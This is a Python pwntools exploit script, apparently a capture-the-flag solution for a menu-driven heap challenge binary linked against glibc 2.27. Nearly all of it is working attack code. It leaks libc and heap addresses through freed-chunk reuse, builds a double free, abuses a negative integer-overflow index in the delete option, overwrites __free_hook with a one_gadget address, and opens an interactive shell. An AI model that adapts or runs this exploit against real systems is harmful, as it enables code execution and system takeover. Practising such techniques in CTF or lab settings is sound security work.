from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.27.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./chall_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sla(b'>', str(idx).encode())

def add(size):
    menu(1)
    sla(b'size: ', str(size).encode())

def delete(idx):
    menu(2)
    sla(b'idx: ', str(idx).encode())

def show(idx):
    menu(3)
    sla(b'idx: ', str(idx).encode())

def edit(idx, content):
    menu(4)
    sla(b'idx: ', str(idx).encode())
    sa(b'content: ', content)

debug('''
   b *$rebase(0xc73) 
   b *$rebase(0xbfb)
''')

for i in range(8):
    add(0x80)
for i in range(8):
    delete(7 - i)
for i in range(7):
    add(0x80)

add(0x10) 
show(7)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 160 - 64 - libc.sym['main_arena']
pr('libc.address', libc.address) #leak_libc

one = libc.address + 0x4f302
free_hook = libc.sym['__free_hook']

show(0)
heap_base = u64(rc(6).ljust(8, b'\x00')) - 0x470
pr('heap_base', heap_base) #leak_heap

edit(7, p64(heap_base + 0x3a0))
edit(1, p64(heap_base + 0x310)) #construct double free

idx = ((1 << 63) + 0x42) - (1 << 64)
delete(idx) #int overflow


add(0x10)
edit(8, p64(free_hook) + p64(8))
edit(0, p64(one)) #one
delete(1)


shell()
